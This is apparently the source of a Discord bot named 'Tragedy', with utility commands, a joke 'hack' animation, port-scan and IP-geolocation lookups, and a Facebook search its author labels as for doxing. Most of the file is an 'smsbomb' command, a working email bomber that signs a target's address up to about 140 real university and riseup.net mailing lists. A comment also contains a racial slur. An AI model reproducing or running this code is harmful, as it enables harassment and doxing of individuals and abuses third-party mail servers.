import discord, discord_webhook, os, datetime, random, datetime, string, itertools
import re, json, requests, aiohttp, asyncio, colorama, PIL, io, base64, webbrowser

from discord.ext import (
    commands,
    tasks
)
from threading import Thread

from discord_webhook import DiscordWebhook, DiscordEmbed

import contextlib

import pythonping
from pythonping import ping as pinger

from itertools import cycle

from colorama import Fore

from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont

from io import BytesIO

#Imports /*-----------------------------------------*/

with open("config.json") as f:
    config = json.load(f)

token = config.get('token')

prefix = config.get('prefix')

#Load Config /*-----------------------------------------*/

footer = "Tragedy - By Surtains/Tragically"

loop = asyncio.get_event_loop()

intents = discord.Intents.all()

client = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)

#Set Variables /*-----------------------------------------*/

def RandColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    r = requests.get('https://hastebin.com/raw/upequxeleb').text
    return "".join(random.choice(r) for i in range(random.randint(2000, 2000)))

def convert(time):
    pos = ["s","m","h","d","min","sec","week","w"]

    time_dict = {"s" : 1, "m" : 60, "h" : 3600 , "d" : 3600*24, "min" : 60, "week": 604800, "w": 604800, "sec": 1}

    unit = time[-1]

    if unit not in pos:
        return -1
    try:
        val = int(time[:-1])
    except:
        return -2


    return val * time_dict[unit]

#Define Functions /*-----------------------------------------*/

@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        print("[Error] | Command Does Not Exist.")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"[Error] | {error} Was Not Specified.".replace(" is a required argument that is missing.", ""))
    elif isinstance(error, commands.BotMissingPermissions):
        print("[Error] | Missing Permissions.")

#Define Events /*-----------------------------------------*/

client.remove_command('help') #Remove Default Help Command lmao

@client.command()
async def urban(ctx, *, phrase): #Urban Dictionary Command lmao
    urb = requests.get(f'http://api.urbandictionary.com/v0/define?term={phrase}').text
    urbb = json.loads(urb)
    try:
        embed = f"""```Term - \"{phrase}\"")
        Definition - {urbb['list'][0]['definition'].replace('[', '').replace(']', '')}
        Example - {urbb['list'][0]['example'].replace('[', '').replace(']', '')}
        
        {footer}```"""
        await ctx.send(embed)
    except:
        pass

@client.command()
async def hack(ctx, user: discord.Member): #Fake Hack Command From Dank Memer That I Re-Wrote lmao
    message = f'{user.id}'
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    thalf = base64_bytes.decode('ascii')
    message = await ctx.send(f'Hacking {user.name}...')
    await asyncio.sleep(1.5)
    await message.edit(content='Finding discord login...')
    await asyncio.sleep(1.7)
    await message.edit(content=f'Found:\n**Email**: "{user.name}\*\*\*@gmail.com"\n**Password**: "\*\*\*\*\*\*\*\*"\n**Discord Token**: "{thalf}\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"')
    await asyncio.sleep(1.7)
    await message.edit(content='Fetching dms...')
    await asyncio.sleep(1)
    await message.edit(content='Listing most common words...')
    await asyncio.sleep(1)
    await message.edit(content=f'Injecting virus into discriminator #{user.discriminator}...')
    await asyncio.sleep(1)
    await message.edit(content='Virus injected')
    await asyncio.sleep(1)
    await message.edit(content='Finding IP address...')
    await asyncio.sleep(2)
    await message.edit(content='Spamming email...')
    await asyncio.sleep(1)
    await message.edit(content='Selling data to facebook...')
    await asyncio.sleep(1)
    await message.edit(content='Complete.')
    await asyncio.sleep(5)
    await message.delete()
    await ctx.message.delete()

#Miscellaneous Commands /*-----------------------------------------*/

@client.command()
async def nmap(ctx, ip: str = '1.1.1.1'):
    if not ip:
        print("[Error] No IP Address Specified.")
    else:
        scan = requests.get(f'https://api.hackertarget.com/nmap/?q={ip}').text
        embed = f"""```Port Scan Results:
        {scan}
        
        {footer}```"""
        await ctx.send(embed)

@client.command(aliases=['trace'])
async def geoip(ctx, *, ip: str = '1.1.1.1'):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=22232633') 
        geo = r.json()
        embed = f"""IP - {geo['query']}
        City - {geo['city']}
        Region/State - {geo['regionName']}
        Country - {geo['country']}
        Continent - {geo['continent']}
        ISP - {geo['isp']}
        Organization - {geo['org']}
        Reverse DNS - {geo['reverse']}
        AS - {geo['as']}
        Mobile? - {geo['mobile']}
        Proxy/VPN? - {geo['proxy']}
        Hosting? - {geo['hosting']}
        
        {footer}"""
        await ctx.send(embed=embed)
    except:
        print("[Error] Invalid Query/No Info Found For That Host.")

@client.command()
async def icmping(ctx, *, ip: str = '1.1.1.1'):
    headers = {
        'Accept': 'application/json'
    }
    r = requests.get(f'https://check-host.net/check-ping?host={ip}&max_nodes=15', headers=headers).text
    host = json.loads(r)
    
    webbrowser.open(host['permanent_link'], new=2)
   
@client.command()
async def tcping(ctx, *, ip: str = '1.1.1.1:443'):
    headers = {
        'Accept': 'application/json'
    }
    r = requests.get(f'https://check-host.net/check-tcp?host={ip}&max_nodes=15', headers=headers).text
    host = json.loads(r)

    webbrowser.open(host['permanent_link'], new=2)

@client.command()
async def ping(ctx, ip: str = '1.1.1.1'):
     res = pinger(f"{ip}", count=10, timeout=.5)
     embed = f"""{res}

     {footer}"""

     await ctx.send(embed)

#Networking Related Commands /*-----------------------------------------*/

@client.command()
async def facebook(ctx, *, query): #Facebook Search (Doxing Purposes)
    urlquery = query.replace(" ", "-")
    urlqueried = f'https://www.facebook.com/public/{urlquery}'
    webbrowser.open(f"{urlqueried}", new=2)

@client.command()
async def smsbomb(ctx, smsEmail): #Boutta Lay Some Real Shit Down Here My Nigga LMAO (I could make a php script to combine all of these but that's a project for later)
    print(f"[Status] SMS/Email Bomber Started | Target - {smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/veteransclub?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/afscmeclerical?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-alumnicsc?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-campus?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-commuter?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-csc152?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-csc212?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-csc424?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/announce-ucf?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/banner-inb?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/bsph_alumni?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/bsw-alumni?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/bsw-first-year?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/bsw-pre-social-work-undergrad?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/bsw-second-year?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/cast-ct?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/cccfellowlist?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/computerclub?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/connecticuttourismeducators?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/connecticuttourismeducators?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/csc-abetmajors?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/csc-womenmajors?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/customerservice?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/drc?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/drc-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/dsw-cohort1?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/dsw-cohort2?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/dsw-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/edl-alumni?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/educational-leadership?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/emeriti-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/environmentalfuturists?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/fasp?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/fitness-m?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/friendsofceasd?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/ft-teaching-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/fto?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/gisct?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/greek-life?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/habitat?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/haven-graduate?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/healthscience?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/icpsr?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/ilsjobs?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/list-owners?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/math-grad?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/math-majors?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/math-minors?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/math-temporary?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/math-tenure?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/mediastudies?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/mft-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/mft-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/mph_alumni?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/mssql-admin?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/msw-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/music.club?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/newmansociety?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/owlclubenewsletter?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/procon-announce?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/psychologyclub?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/recandleisure-gradstudents?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/recandleisure-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/reslife-labworkers?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/reslife-studentemployees?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/s2acs?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/schoolofbusiness-all?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/scsu_scala?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/scsunursing?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/socialwork-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/socialwork-faculty-committee?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/socialwork-fulltime-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/socialwork-parttime-faculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/socialwork-students?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soeadjuncts?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soealumni?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soechairs?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soefaculty?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soegraduatestudents?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soeleadership?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soeprospectivemajors?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soestrategicplanning?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soestudentleadership?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soestudents?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/soeunit?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/studentaccounts?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/studentplanning?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/vawo?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/wacc?email={smsEmail}")
    requests.post(f"https://lists.southernct.edu/mailman/subscribe/writeon?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/25live_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/aapi-wa_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/abawdnavigators_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/abedir_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/acc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/accred_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/aew_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/association_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/atc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/atcoord_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/atd-northwestconsortium_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/atlc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bac_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bar_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bas_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bfet_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bkstcncl_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/bkstmgrs_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/blc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/campusce_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/casas_cadre_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/cato_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/cavp_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/cbe_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/cesc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/chs_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/clams-l_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/cmms_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/coldg_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/conted_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/crm-admins_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/ctcaccess_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/ctcaccess_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/ctcep_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/ctclda_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.ctc.edu/mailman/listinfo/ctclink-celc_lists.ctc.edu?email={smsEmail}")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=peoplescommissionnews&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=whitenoiseaction&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=acl_mixite_choisie&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=activistkingston&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=adalumni&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=aflrbs&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=aflrk_newsletter&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=agendadubocal&action=subrequest&via_subrequest=1&action_subrequest=submit")
    requests.post(f"https://lists.riseup.net/www?email={smsEmail}&list=autonomiafeminista&action=subrequest&via_subrequest=1&action_subrequest=submit")

    print(f"[Status] SMS/Email Bomber Stopped")

#Doxing/Abuse Related Commands /*-----------------------------------------*/

client.run(f"{token}")

#Log-into Account Via Token /*-----------------------------------------*/